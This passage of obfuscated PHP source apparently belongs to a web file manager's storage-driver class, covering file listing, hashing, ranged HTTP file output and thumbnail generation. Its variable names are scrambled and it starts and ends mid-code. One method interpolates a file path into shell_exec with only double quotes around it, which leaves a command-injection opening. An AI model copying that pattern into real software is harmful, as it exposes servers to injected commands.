$ïÔêÅ¹; continue; } $ÖêÃç¿[] = $ïÔêÅ¹; $À‚ï¾¬ = $çş»×ú[$²íÇŠŸ¦[87]]; $å…Ø¶Á = $this->pathDriver; if (substr($çş»×ú[$²íÇŠŸ¦[87]], 0, strlen($å…Ø¶Á)) == $å…Ø¶Á) { $À‚ï¾¬ = substr($À‚ï¾¬, strlen($å…Ø¶Á)); } $this->listAllMake($À‚ï¾¬, $ÖêÃç¿); } } public function listAllSimple($ÙôÈšÁù, $Ìöè‘´Ò = false) { $È¥œø‰Ì = $this->listAll($ÙôÈšÁù); return $this->listAllSimpleMake($È¥œø‰Ì, $this->getPathOuter($ÙôÈšÁù), $Ìöè‘´Ò); } public function listAllSimpleMake($¼Œ›‹³ç, $§ËÀÒö—, $ùûµÙ³Š) { $µÓã†®İ =& $_SERVER[¼¥ÊĞÙÌ]; $°ûÈÆµŞ = array(); $§ËÀÒö— = rtrim(get_path_father($§ËÀÒö—), $µÓã†®İ[8]) . $µÓã†®İ[8]; foreach ($¼Œ›‹³ç as $ñøáñèü) { $„ö›½­ = array($µÓã†®İ[87] => $ñøáñèü[$µÓã†®İ[87]], $µÓã†®İ[89] => $ñøáñèü[$µÓã†®İ[87]], $µÓã†®İ[78] => $ñøáñèü[$µÓã†®İ[78]]); if (isset($ñøáñèü[$µÓã†®İ[79]]) && !$ñøáñèü[$µÓã†®İ[78]]) { $„ö›½­[$µÓã†®İ[79]] = $ñøáñèü[$µÓã†®İ[79]]; } if (isset($ñøáñèü[$µÓã†®İ[88]])) { $„ö›½­[$µÓã†®İ[88]] = $ñøáñèü[$µÓã†®İ[88]]; } if (is_array($ñøáñèü[$µÓã†®İ[90]])) { $„ö›½­[$µÓã†®İ[89]] = $ñøáñèü[$µÓã†®İ[90]][$µÓã†®İ[87]]; $„ö›½­[$µÓã†®İ[79]] = $ñøáñèü[$µÓã†®İ[90]][$µÓã†®İ[79]]; $„ö›½­[$µÓã†®İ[88]] = $ñøáñèü[$µÓã†®İ[90]][$µÓã†®İ[88]]; } else { if (substr($ñøáñèü[$µÓã†®İ[87]], 0, strlen($§ËÀÒö—)) == $§ËÀÒö—) { $„ö›½­[$µÓã†®İ[87]] = substr($ñøáñèü[$µÓã†®İ[87]], strlen($§ËÀÒö—)); } } $ ËóÕÆĞ = $ñøáñèü[$µÓã†®İ[78]] ? $µÓã†®İ[8] : $µÓã†®İ[12]; $„ö›½­[$µÓã†®İ[89]] = rtrim($„ö›½­[$µÓã†®İ[89]], $µÓã†®İ[8]) . $ ËóÕÆĞ; $„ö›½­[$µÓã†®İ[87]] = $µÓã†®İ[8] . trim($„ö›½­[$µÓã†®İ[87]], $µÓã†®İ[8]) . $ ËóÕÆĞ; if (!$ùûµÙ³Š) { $áêÑ©¬é = explode($µÓã†®İ[8], trim($„ö›½­[$µÓã†®İ[87]], $µÓã†®İ[8])); $„ö›½­[$µÓã†®İ[87]] = $µÓã†®İ[8] . implode($µÓã†®İ[8], array_slice($áêÑ©¬é, 1)) . $ ËóÕÆĞ; } $°ûÈÆµŞ[] = $„ö›½­; } return array_sort_by($°ûÈÆµŞ, $µÓã†®İ[87]); } public function upload($­ÖóÑİİ, $“ŒÎÏØğ, $Ú¿ß·Å¬ = false, $­«ÊÈÉ¹ = REPEAT_REPLACE) { } public function uploadFileByID($ ²¹’Õ, $™¤¦¶İÈ, $ÑÑ›Ì„²) { } public function uploadFileByPath($öÂ“š…, $§åŸ¨Äø, $¸­à¶º± = array()) { } public function isUploadServer() { $šºĞÒı =& $_SERVER[¼¥ÊĞÙÌ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $šºĞÒı[91]) { return !0; } return $GLOBALS[$šºĞÒı[6]][$šºĞÒı[92]][$šºĞÒı[93]]; } public function isFileOutServer() { $×âË˜è¸ =& $_SERVER[¼¥ÊĞÙÌ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $×âË˜è¸[91]) { return !0; } return $GLOBALS[$×âË˜è¸[6]][$×âË˜è¸[92]][$×âË˜è¸[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($‘ë÷ã²í) { $—”£İÉ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$this->isCdnHost()) { return $‘ë÷ã²í; } return str_replace(trim(get_url_root($‘ë÷ã²í), $—”£İÉ[8]), trim($this->cdnHost, $—”£İÉ[8]), $‘ë÷ã²í); } public function uploadLink($€—¶ÜÉÉ, $ŸÍú÷¨ = 0) { $òşŒïÛá =& $_SERVER[¼¥ÊĞÙÌ]; if ($this->isUploadServer()) { return; } $ïœôÆ = $this->getType(); if (!in_array($ïœôÆ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $çÉƒî = 1024 * 1024 * 10; $Ó¶°Œîï = $ŸÍú÷¨ <= $çÉƒî ? $òşŒïÛá[95] : $òşŒïÛá[96]; $•± ÌàÆ = (!$ŸÍú÷¨ ? 1 : ceil($ŸÍú÷¨ / pow(1024, 3))) * 3600 * 4; $Ò‰¸´ôõ = $this->{$Ó¶°Œîï}($€—¶ÜÉÉ, $•± ÌàÆ); if ($Ò‰¸´ôõ) { $Ò‰¸´ôõ[$òşŒïÛá[97]] = $€—¶ÜÉÉ; $Ò‰¸´ôõ[$òşŒïÛá[98]] = $ïœôÆ; } return $Ò‰¸´ôõ; } public function uploadFormData($æºˆ°Ô„, $ê–¶Ì† = 3600) { } public function uploadMultiData($ÆÆæİØé, $ß¨é«Ï¹ = 3600) { } public function multiUploadFormData($¼¹Î­ , $ÒíŒ…ùø = 3600) { return $this->uploadMultiData($¼¹Î­ , $ÒíŒ…ùø); } public function download($´Ó£æâŠ, $õ«Ä¦Ú®) { } public function ext($ÙŒµ˜ûù) { $¤±ÔŠÆì =& $_SERVER[¼¥ÊĞÙÌ]; if (strpos($ÙŒµ˜ûù, $¤±ÔŠÆì[8]) === -1) { $Ü•áÅ÷ = $ÙŒµ˜ûù; } else { $Ü•áÅ÷ = $this->pathThis($ÙŒµ˜ûù); } $şí‚ñç = $¤±ÔŠÆì[12]; if (strstr($Ü•áÅ÷, $¤±ÔŠÆì[10])) { $şí‚ñç = substr($Ü•áÅ÷, strrpos($Ü•áÅ÷, $¤±ÔŠÆì[10]) + 1); $şí‚ñç = strtolower($şí‚ñç); } if (strlen($şí‚ñç) > 3 && preg_match($¤±ÔŠÆì[99], $şí‚ñç, $¥è÷úìõ)) { $şí‚ñç = $¤±ÔŠÆì[12]; } return $şí‚ñç; } public function pathThis($ÁòáßÊ°) { $Õ¨ÌóŠ =& $_SERVER[¼¥ÊĞÙÌ]; $ÁòáßÊ° = str_replace($Õ¨ÌóŠ[100], $Õ¨ÌóŠ[8], rtrim($ÁòáßÊ°, $Õ¨ÌóŠ[8])); $¢‘ÉØÈè = strrpos($ÁòáßÊ°, $Õ¨ÌóŠ[8]); if ($¢‘ÉØÈè === !1) { return $ÁòáßÊ°; } return substr($ÁòáßÊ°, $¢‘ÉØÈè + 1); } public function pathFather($ş‘Ö«ÀÈ) { $ï×èèË— =& $_SERVER[¼¥ÊĞÙÌ]; $ş‘Ö«ÀÈ = str_replace($ï×èèË—[100], $ï×èèË—[8], rtrim($ş‘Ö«ÀÈ, $ï×èèË—[8])); $—¶ÁÛÅ“ = strrpos($ş‘Ö«ÀÈ, $ï×èèË—[8]); if ($—¶ÁÛÅ“ === !1) { return $ï×èèË—[12]; } return substr($ş‘Ö«ÀÈ, 0, $—¶ÁÛÅ“ + 1); } public function hashSimple($‹ƒÃõä¥) { $›”ÁÖ€¢ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$‹ƒÃõä¥) { return md5($›”ÁÖ€¢[12]); } $¤•…Ëí„ = $this->size($‹ƒÃõä¥); $¹»ÈƒÁã = 200; $´öÄ†‹¶ = 50; if ($¤•…Ëí„ <= $¹»ÈƒÁã * $´öÄ†‹¶) { return $this->hashMd5($‹ƒÃõä¥) . $¤•…Ëí„; } $ó ¦ÄôÊ = intval($¤•…Ëí„ / $´öÄ†‹¶); $šĞ•–ªè = $›”ÁÖ€¢[12]; for ($‰…¸Ä‘Í = 0; $‰…¸Ä‘Í < $´öÄ†‹¶; $‰…¸Ä‘Í++) { $šĞ•–ªè .= $this->fileSubstr($‹ƒÃõä¥, $ó ¦ÄôÊ * $‰…¸Ä‘Í, $¹»ÈƒÁã); } $šĞ•–ªè .= $this->fileSubstr($‹ƒÃõä¥, $¤•…Ëí„ - $¹»ÈƒÁã, $¹»ÈƒÁã); return md5($šĞ•–ªè) . $¤•…Ëí„; } public static $md5Cache = array(); public function hashMd5($–”şš«) { if (!$–”şš«) { return md5($_SERVER[¼¥ÊĞÙÌ][12]); } $–”şš« = $this->iconvSystem($–”şš«); if (isset(self::$md5Cache[$–”şš«])) { return self::$md5Cache[$–”şš«]; } self::$md5Cache[$–”şš«] = $this->hashMd5Shell($–”şš«); if (!self::$md5Cache[$–”şš«]) { self::$md5Cache[$–”şš«] = @md5_file($–”şš«); } return self::$md5Cache[$–”şš«]; } private function hashMd5Shell($¥À¿¼¼£) { $ÁÅŒ¤ˆš =& $_SERVER[¼¥ÊĞÙÌ]; if (!$¥À¿¼¼£) { return md5($ÁÅŒ¤ˆš[12]); } if (!function_exists($ÁÅŒ¤ˆš[101])) { return !1; } $…ª‘ğÑ’ = array($ÁÅŒ¤ˆš[102], $ÁÅŒ¤ˆš[103]); $À­Ğá— = Cache::get($ÁÅŒ¤ˆš[104]); if (!$À­Ğá—) { $•Ä­§ = BASIC_PATH . $ÁÅŒ¤ˆš[105]; $•£æ›µ‚ = md5_file($•Ä­§); $À­Ğá— = $ÁÅŒ¤ˆš[106]; foreach ($…ª‘ğÑ’ as $ŒğäÃ±§) { $÷˜ÇÇßš = shell_exec($ŒğäÃ±§ . "\x20\x22{$•Ä­§}\42"); if ($÷˜ÇÇßš && substr(trim($÷˜ÇÇßš), 0, 32) == $•£æ›µ‚) { $À­Ğá— = $ŒğäÃ±§; break; } } Cache::set($ÁÅŒ¤ˆš[104], $À­Ğá—, 3600); } if ($À­Ğá— == $ÁÅŒ¤ˆš[106]) { return !1; } $÷˜ÇÇßš = shell_exec($À­Ğá— . "\40\x22{$¥À¿¼¼£}\x22"); $÷˜ÇÇßš = str_replace($ÁÅŒ¤ˆš[107], $ÁÅŒ¤ˆš[12], $÷˜ÇÇßš); return substr($÷˜ÇÇßš, 0, 32); } public function link($ÌïòÍŸŒ) { return $ÌïòÍŸŒ; } public function fileOut($Ãª‹åŸ, $ë£Û¥Ã¥ = false, $‘Å¤ŒèÊ = false, $½ŠòĞ•Å = '') { $Ü•¦Áïğ =& $_SERVER[¼¥ÊĞÙÌ]; $this->cacheMethod(null, null); if (!$Ãª‹åŸ || !$this->exist($Ãª‹åŸ)) { show_json(LNG($Ü•¦Áïğ[108]), !1, $‘Å¤ŒèÊ); } $ŞÚª‡Ñá = $this->getType() == $Ü•¦Áïğ[109]; $œşÆ©¨¨ = $GLOBALS[$Ü•¦Áïğ[6]][$Ü•¦Áïğ[92]][$Ü•¦Áïğ[110]][$Ü•¦Áïğ[111]]; $Ê‰ëœƒ = (double) $GLOBALS[$Ü•¦Áïğ[6]][$Ü•¦Áïğ[92]][$Ü•¦Áïğ[110]][$Ü•¦Áïğ[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $Û“€ëÊŞ = $this->infoFull($Ãª‹åŸ); $áĞè‡“´ = $Û“€ëÊŞ[$Ü•¦Áïğ[79]]; $²´ÜûíÏ = gmdate($Ü•¦Áïğ[113], $Û“€ëÊŞ[$Ü•¦Áïğ[88]]); $ ©Œ•é‰ = $‘Å¤ŒèÊ ? $‘Å¤ŒèÊ : $this->iconvApp($Û“€ëÊŞ[$Ü•¦Áïğ[32]]); $‰¨“¤©÷ = 0; $‡®¸ƒÎ• = $áĞè‡“´ - 1; $Ì¡®Èï¸ = $this->ext($ ©Œ•é‰); if (in_array($Ì¡®Èï¸, array($Ü•¦Áïğ[114], $Ü•¦Áïğ[115], $Ü•¦Áïğ[116], $Ü•¦Áïğ[117]))) { $Ì¡®Èï¸ = $Ü•¦Áïğ[118]; } if (in_array($Ì¡®Èï¸, array($Ü•¦Áïğ[119]))) { $Ì¡®Èï¸ = $Ü•¦Áïğ[120]; } if (!$½ŠòĞ•Å) { $½ŠòĞ•Å = md5($²´ÜûíÏ . $áĞè‡“´); } $½ŠòĞ•Å = $Ü•¦Áïğ[121] . $½ŠòĞ•Å . $Ü•¦Áïğ[121]; $ù×†ƒè€ = get_file_mime($Ì¡®Èï¸); $åôóØÈØ = !0; $åôóØÈØ = isset($_GET[$Ü•¦Áïğ[122]]) ? !1 : !0; if ($ë£Û¥Ã¥ === !1 && !mime_support($ù×†ƒè€)) { $ù×†ƒè€ = $Ü•¦Áïğ[123]; } header($Ü•¦Áïğ[124]); header($Ü•¦Áïğ[125] . $ù×†ƒè€); $Ï¤‡÷‡ñ = rawurlencode($ ©Œ•é‰); $Ï¤‡÷‡ñ = $Ü•¦Áïğ[121] . $Ï¤‡÷‡ñ . $Ü•¦Áïğ[126] . $Ï¤‡÷‡ñ; if ($ë£Û¥Ã¥) { header($Ü•¦Áïğ[127]); header($Ü•¦Áïğ[128] . $Ï¤‡÷‡ñ); } else { if ($åôóØÈØ) { header($Ü•¦Áïğ[129] . $Ï¤‡÷‡ñ); } } $Ø±Ô„ñ¾ = 3600 * 24 * 30; header($Ü•¦Áïğ[130]); header($Ü•¦Áïğ[131]); header($Ü•¦Áïğ[132] . $Ø±Ô„ñ¾); header($Ü•¦Áïğ[133] . gmdate($Ü•¦Áïğ[113], time() + $Ø±Ô„ñ¾) . $Ü•¦Áïğ[134]); if (isset($_SERVER[$Ü•¦Áïğ[135]]) && strtotime($_SERVER[$Ü•¦Áïğ[135]]) == $Û“€ëÊŞ[$Ü•¦Áïğ[88]]) { header($Ü•¦Áïğ[136], !0, 304); die; } if (isset($_SERVER[$Ü•¦Áïğ[137]]) && $_SERVER[$Ü•¦Áïğ[137]] == $½ŠòĞ•Å) { header($Ü•¦Áïğ[138] . $½ŠòĞ•Å, !0, 304); die; } header($Ü•¦Áïğ[138] . $½ŠòĞ•Å); header($Ü•¦Áïğ[139] . $²´ÜûíÏ . $Ü•¦Áïğ[134]); header($Ü•¦Áïğ[140] . $ ©Œ•é‰); header($Ü•¦Áïğ[141]); header($Ü•¦Áïğ[142] . $áĞè‡“´); header($Ü•¦Áïğ[143]); Hook::trigger($Ü•¦Áïğ[144], $Ãª‹åŸ, $áĞè‡“´, $ ©Œ•é‰, $Ì¡®Èï¸); if (!$ë£Û¥Ã¥ && $Ì¡®Èï¸ == $Ü•¦Áïğ[145]) { if ($áĞè‡“´ > 1024 * 1024 * 5) { die; } $°à…ğ« = $this->getContent($Ãª‹åŸ); $°à…ğ« = Html::clearSVG($°à…ğ«); header($Ü•¦Áïğ[146] . strlen($°à…ğ«)); echo $°à…ğ«; die; } $™±¿ìµ = strtolower($_SERVER[$Ü•¦Áïğ[147]]); if ($ŞÚª‡Ñá && $™±¿ìµ && $œşÆ©¨¨) { if (strstr($™±¿ìµ, $Ü•¦Áïğ[148])) { header($Ü•¦Áïğ[149] . $Ãª‹åŸ); } else { if (strstr($™±¿ìµ, $Ü•¦Áïğ[150])) { header($Ü•¦Áïğ[151] . $Ãª‹åŸ); } else { if (strstr($™±¿ìµ, $Ü•¦Áïğ[152])) { header($Ü•¦Áïğ[153] . $Ãª‹åŸ); } } } if ($Ê‰ëœƒ) { header($Ü•¦Áïğ[154] . $Ê‰ëœƒ); } return; } if (isset($_SERVER[$Ü•¦Áïğ[155]])) { if (preg_match($Ü•¦Áïğ[156], $_SERVER[$Ü•¦Áïğ[155]], $ÙòÊÒòÊ)) { $‰¨“¤©÷ = intval($ÙòÊÒòÊ[1]); $‰¨“¤©÷ = $‰¨“¤©÷ <= 0 ? 0 : ($‰¨“¤©÷ >= $‡®¸ƒÎ• ? $‡®¸ƒÎ• : $‰¨“¤©÷); if (!empty($ÙòÊÒòÊ[2])) { $­ÙÈ¢é = intval($ÙòÊÒòÊ[2]); $‡®¸ƒÎ• = $­ÙÈ¢é < $‰¨“¤©÷ ? $‰¨“¤©÷ : ($­ÙÈ¢é >= $‡®¸ƒÎ• ? $‡®¸ƒÎ• : $­ÙÈ¢é); } } header($Ü•¦Áïğ[157]); header("\103\157\156\164\145\x6e\164\55\122\x61\x6e\x67\145\72\x20\142\x79\164\145\163\x20{$‰¨“¤©÷}\x2d{$‡®¸ƒÎ•}\x2f" . $áĞè‡“´); } else { header($Ü•¦Áïğ[158]); } header($Ü•¦Áïğ[159]); header($Ü•¦Áïğ[160]); $¤¥Ş­êú = !0; if ($_SERVER[$Ü•¦Áïğ[161]] == $Ü•¦Áïğ[162] && $áĞè‡“´ > 1204 * 1024 * 1024 * 2) { $¤¥Ş­êú = !1; } if ($¤¥Ş­êú) { header($Ü•¦Áïğ[163] . ($‡®¸ƒÎ• - $‰¨“¤©÷ + 1)); } if ($_SERVER[$Ü•¦Áïğ[164]] == $Ü•¦Áïğ[165]) { return; } $Ùç®¹âØ = array($Ü•¦Áïğ[166] => !1, $Ü•¦Áïğ[167] => $‰¨“¤©÷, $Ü•¦Áïğ[168] => $‡®¸ƒÎ•, $Ü•¦Áïğ[169] => $Ì¡®Èï¸, $Ü•¦Áïğ[170] => $Û“€ëÊŞ, $Ü•¦Áïğ[171] => $Ü•¦Áïğ[12], $Ü•¦Áïğ[172] => 0); $Ùç®¹âØ = Hook::filter($Ü•¦Áïğ[173], $Ùç®¹âØ); $îËŞ€›¥ = 1024 * 300; $³¾„÷ = 0; if ($Ê‰ëœƒ) { $³¾„÷ = intval(1000 * 1000 * ($îËŞ€›¥ / $Ê‰ëœƒ)); } while ($‰¨“¤©÷ <= $‡®¸ƒÎ•) { $ºæ‘Œ¢è = timeFloat(); check_abort(); $ì¯Ñ³á = $‡®¸ƒÎ• - $‰¨“¤©÷ + 1; if ($ì¯Ñ³á <= $îËŞ€›¥) { $îËŞ€›¥ = $ì¯Ñ³á; } $°à…ğ« = $this->fileSubstr($Ãª‹åŸ, $‰¨“¤©÷, $îËŞ€›¥); if ($Ùç®¹âØ[$Ü•¦Áïğ[166]]) { $Ùç®¹âØ[$Ü•¦Áïğ[171]] = $°à…ğ«; $Ùç®¹âØ[$Ü•¦Áïğ[172]] = $‰¨“¤©÷; $Ùç®¹âØ = Hook::filter($Ü•¦Áïğ[174], $Ùç®¹âØ); $°à…ğ« = $Ùç®¹âØ[$Ü•¦Áïğ[171]]; } echo $°à…ğ«; $‰¨“¤©÷ += $îËŞ€›¥; if ($îËŞ€›¥ == $ì¯Ñ³á) { $‰¨“¤©÷ = $‡®¸ƒÎ• + 1; } if ($³¾„÷) { $‡Õ–‰² = intval(1000 * 1000 * (timeFloat() - $ºæ‘Œ¢è)); $úîèŸÈ = $³¾„÷ - $‡Õ–‰²; if ($úîèŸÈ > 5) { usleep($úîèŸÈ); } } } } public function fileOutServer($àı÷Ê¦´, $€›Ÿ¥¢ = false, $¬ó¿Û˜ğ = false, $êé€åø = '') { $this->fileOut($àı÷Ê¦´, $€›Ÿ¥¢, $¬ó¿Û˜ğ, $êé€åø); } public function fileOutLink($ŞÊà¡èï) { header($_SERVER[¼¥ÊĞÙÌ][175] . $ŞÊà¡èï); die; } public function cacheMethod($ú¯Š—Æü, $êĞ†Ş³¥, $ºóĞ»×÷ = null) { $€¯¶ä®Ò =& $_SERVER[¼¥ÊĞÙÌ]; static $¥Í”ŠìÛ = array(); $­ûÀ¶»ø = $êĞ†Ş³¥ ? ltrim($this->getPathOuter($êĞ†Ş³¥), $€¯¶ä®Ò[8]) : $€¯¶ä®Ò[12]; $ÇÒ•¨“ = $€¯¶ä®Ò[176] . $ú¯Š—Æü . $€¯¶ä®Ò[177] . rtrim($­ûÀ¶»ø, $€¯¶ä®Ò[8]); if (is_null($ú¯Š—Æü)) { $¥Í”ŠìÛ = array(); return; } if (is_null($êĞ†Ş³¥)) { foreach ($¥Í”ŠìÛ as $ÇÒ•¨“ => $‡Šºä¯) { if (!strstr($ÇÒ•¨“, $€¯¶ä®Ò[176] . $ú¯Š—Æü . $€¯¶ä®Ò[178])) { continue; } unset($¥Í”ŠìÛ[$ÇÒ•¨“]); } return; } if ($ºóĞ»×÷ === $€¯¶ä®Ò[179]) { unset($¥Í”ŠìÛ[$ÇÒ•¨“]); return; } if (!is_null($ºóĞ»×÷)) { $¥Í”ŠìÛ[$ÇÒ•¨“] = $ºóĞ»×÷; return; } $ò¼¬¥š = isset($¥Í”ŠìÛ[$ÇÒ•¨“]) ? $¥Í”ŠìÛ[$ÇÒ•¨“] : null; if (!is_null($ò¼¬¥š)) { return $ò¼¬¥š; } $ò¼¬¥š = $this->{$ú¯Š—Æü}($êĞ†Ş³¥); $¥Í”ŠìÛ[$ÇÒ•¨“] = $ò¼¬¥š; return $ò¼¬¥š; } public function cacheMethodInfoSet($¿¹ÏœèŠ, $ºñ ïıÙ, $¥ö®Óâš = false) { $šÄ‚ñµÇ =& $_SERVER[¼¥ÊĞÙÌ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($šÄ‚ñµÇ[180], $¿¹ÏœèŠ, $ºñ ïıÙ); $this->cacheMethod($šÄ‚ñµÇ[181], $¿¹ÏœèŠ, $ºñ ïıÙ ? !1 : !0); if (is_array($¥ö®Óâš)) { $this->cacheMethod($šÄ‚ñµÇ[182], $¿¹ÏœèŠ, $¥ö®Óâš); } } public function fileOutImage($†ÜûƒŞü, $‹Ô„Â¥Ò = 250) { $ÃÆù±ß =& $_SERVER[¼¥ÊĞÙÌ]; set_timeout(); if (substr($†ÜûƒŞü, 0, 4) == $ÃÆù±ß[152]) { $this->fileOutLink($†ÜûƒŞü); } $ôÓ·³Íí = $this->info($†ÜûƒŞü); $É“«ıÔ« = !1; $ÎÂê¦º = isset($GLOBALS[$ÃÆù±ß[183]]) ? $GLOBALS[$ÃÆù±ß[183]] : array(); if ($ÎÂê¦º && $ÎÂê¦º[$ÃÆù±ß[184]] == $ôÓ·³Íí[$ÃÆù±ß[87]]) { $ôÓ·³Íí = $ÎÂê¦º; $Ò» ¢ = $ôÓ·³Íí[$ÃÆù±ß[185]]; if ($Ò» ¢ && isset($Ò» ¢[$ÃÆù±ß[186]])) { if ($Ò» ¢[$ÃÆù±ß[186]] <= $‹Ô„Â¥Ò && $Ò» ¢[$ÃÆù±ß[187]] <= $‹Ô„Â¥Ò) { $É“«ıÔ« = !0; } } } if ($ôÓ·³Íí[$ÃÆù±ß[79]] <= 1024 * 50 || $É“«ıÔ« || !function_exists($ÃÆù±ß[188]) || $ôÓ·³Íí[$ÃÆù±ß[169]] == $ÃÆù±ß[189]) { return $this->fileOut($†ÜûƒŞü, !1, $ôÓ·³Íí[$ÃÆù±ß[32]]); } $¹ÕªŒÖÃ = kodIO::hashPath($ôÓ·³Íí); $¶›ûµüø = "\143\x6f\166\x65\162\137{$¹ÕªŒÖÃ}\137{$‹Ô„Â¥Ò}\56\x70\x6e\x67"; $³Ã¾Ìó = IO_PATH_SYSTEM_TEMP . $ÃÆù±ß[190]; $âéŒÃï = IO::infoFullSimple($³Ã¾Ìó); $ƒàŒ„¢é = $âéŒÃï && is_array($âéŒÃï) ? $âéŒÃï[$ÃÆù±ß[87]] : $ÃÆù±ß[12]; if (!$ƒàŒ„¢é) { $ƒàŒ„¢é = IO::mkdir($³Ã¾Ìó); } if ($ôÓ·³Íí[$ÃÆù±ß[191]] == $ÃÆù±ß[192] && isset($ôÓ·³Íí[$ÃÆù±ß[193]]) && $ôÓ·³Íí[$ÃÆù±ß[193]] == kodIO::sourceID($ƒàŒ„¢é)) { $µÃ„‘ß¥ = $ôÓ·³Íí[$ÃÆù±ß[194]]; if ($‹Ô„Â¥Ò <= 500) { $Ü£éÚ¾… = preg_replace($ÃÆù±ß[195], $ÃÆù±ß[196], $ôÓ·³Íí[$ÃÆù±ß[32]]); $µÃ„‘ß¥ = IO::fileNameExist($ƒàŒ„¢é, $Ü£éÚ¾…); } return IO::fileOut(KodIO::make($µÃ„‘ß¥), !1, $ôÓ·³Íí[$ÃÆù±ß[32]]); } $ó²©›®á = IO::fileNameExist($ƒàŒ„¢é, $¶›ûµüø); if ($ó²©›®á) { return IO::fileOut(KodIO::make($ó²©›®á), !1, $ôÓ·³Íí[$ÃÆù±ß[32]]); } if ($‹Ô„Â¥Ò > 1000) { $this->makeImageCover($ƒàŒ„¢é, $†ÜûƒŞü, $¶›ûµüø, $‹Ô„Â¥Ò); $this->makeImageCover($ƒàŒ„¢é, $†ÜûƒŞü, "\143\x6f\x76\145\x72\x5f{$¹ÕªŒÖÃ}\x5f\62\65\60\x2e\x70\156\147", 250); $ó²©›®á = IO::fileNameExist($ƒàŒ„¢é, $¶›ûµüø); if ($ó²©›®á) { return IO::fileOut(KodIO::make($ó²©›®á), !1, $ôÓ·³Íí[$ÃÆù±ß[32]]); } die; } if (!kodIO::allowCover($ôÓ·³Íí)) { return $this->fileOut($†ÜûƒŞü, !1, $ôÓ·³Íí[$ÃÆù±ß[32]]); } $÷Ï¥şÕí = Cache::get($¶›ûµüø); if ($÷Ï¥şÕí == $ÃÆù±ß[197] || $÷Ï¥şÕí == $ÃÆù±ß[198]) { echo $÷Ï¥şÕí; die; } Cache::set($¶›ûµüø, $ÃÆù±ß[198], 60); $û†ü–ñô = array($ƒàŒ„¢é, $ôÓ·³Íí[$ÃÆù±ß[87]], $¶›ûµüø, $‹Ô„Â¥Ò); $šïªÒÁ˜ = $ÃÆù±ß[199] . $ôÓ·³Íí[$ÃÆù±ß[79]] . $ÃÆù±ß[200] . $¶›ûµüø . $ÃÆù±ß[201] . $ôÓ·³Íí[$ÃÆù±ß[32]] . $ÃÆù±ß[202] . $ôÓ·³Íí[$ÃÆù±ß[87]]; TaskQueue::add($ÃÆù±ß[203], $û†ü–ñô, $šïªÒÁ˜, $¶›ûµüø); } public function makeImageCover($”¸­ÅÀ, $ÍæÍÃØÇ, $ëŒ×Ó“§, $Í‡ãıÉÇ) { $î˜Å‰÷— =& $_SERVER[¼¥ÊĞÙÌ]; if (IO::fileNameExist($”¸­ÅÀ, $ëŒ×Ó“§)) { return $î˜Å‰÷—[204]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $«Ü­Üñ¨ = $this->getPathOuter($ÍæÍÃØÇ); $å§ÁËÍ· = DATA_THUMB . $ëŒ×Ó“§; del_file($å§ÁËÍ·); $êìÜı¯› = IO::copy($«Ü­Üñ¨, TEMP_FILES, !1, $ëŒ×Ó“§); if (!@file_exists($êìÜı¯›)) { return $î˜Å‰÷—[205]; } ImageThumb::createThumb($êìÜı¯›, $å§ÁËÍ·, $Í‡ãıÉÇ, $Í‡ãıÉÇ * 10); if (@file_exists($å§ÁËÍ·)) { Cache::remove($ëŒ×Ó“§); return IO::move($å§ÁËÍ·, $”¸­ÅÀ); } Cache::set($ëŒ×Ó“§, $î˜Å‰÷—[197], 600); del_file($å§ÁËÍ·); return $î˜Å‰÷—[206] . $êìÜı¯› . $î˜Å‰÷—[74]; } public function fileOutImageServer($¨ä½Œ„—, $ —•Õ = 250) { $this->fileOutImage($¨ä½Œ„—, $ —•Õ); } public function fileNameAuto($—Ñè±¿, $…ÒëâÏ², $¾¿¿ù…ª = REPEAT_RENAME, $²´‘¡Ì‡ = false) { $ø€€Œı¿ =& $_SERVER[¼¥ÊĞÙÌ]; $„õØİ¬ó = $—Ñè±¿ === $ø€€Œı¿[12] ? $…ÒëâÏ² : rtrim($—Ñè±¿, $ø€€Œı¿[8]) . $ø€€Œı¿[8] . $…ÒëâÏ²; if ($¾¿¿ù…ª == REPEAT_REPLACE || !$this->exist($„õØİ¬ó) || $²´‘¡Ì‡ && $¾¿¿ù…ª != REPEAT_RENAME_FOLDER) { return $…ÒëâÏ²; } if ($¾¿¿ù…ª == REPEAT_SKIP) { return !1; } $êäôÆó£ = $ø€€Œı¿[10] . get_path_ext($…ÒëâÏ²); $êäôÆó£ = $êäôÆó£ == $ø€€Œı¿[10] || $²´‘¡Ì‡ ? $ø€€Œı¿[12] : $êäôÆó£; $¾Ê¤‹– = 1; $óíåç÷‰ = substr($…ÒëâÏ², 0, strlen($…ÒëâÏ²) - strlen($êäôÆó£)); $ÖƒÓÁ = $óíåç÷‰ . "\x28{$¾Ê¤‹–}\x29{$êäôÆó£}"; while ($this->exist(rtrim($—Ñè±¿, $ø€€Œı¿[8]) . $ø€€Œı¿[8] . $ÖƒÓÁ)) { $ÖƒÓÁ = $óíåç÷‰ . "\50{$¾Ê¤‹–}\x29{$êäôÆó£}"; $¾Ê¤‹–++; } return $ÖƒÓÁ; } private function fileNameAutoList($ÁÂ·· À, $„Ì¾êĞ, $Ö‡‡’ğ½ = false) { $ãğ×Ÿóç =& $_SERVER[¼¥ÊĞÙÌ]; $ÏÉºİ = $this->listPath($ÁÂ·· À, !0); $ÏÉºİ = array_merge($ÏÉºİ[$ãğ×Ÿóç[85]], $ÏÉºİ[$ãğ×Ÿóç[86]]); $­—‰ü³Ú = array_to_keyvalue($ÏÉºİ, $ãğ×Ÿóç[12], $ãğ×Ÿóç[32]); $©¨ÊÊÌè = $ãğ×Ÿóç[10] . get_path_ext($„Ì¾êĞ); $©¨ÊÊÌè = $©¨ÊÊÌè == $ãğ×Ÿóç[10] || $Ö‡‡’ğ½ ? $ãğ×Ÿóç[12] : $©¨ÊÊÌè; $¿Ú­Ş„Ğ = substr($„Ì¾êĞ, 0, strlen($„Ì¾êĞ) - strlen($©¨ÊÊÌè)); $Â³©ñÆº 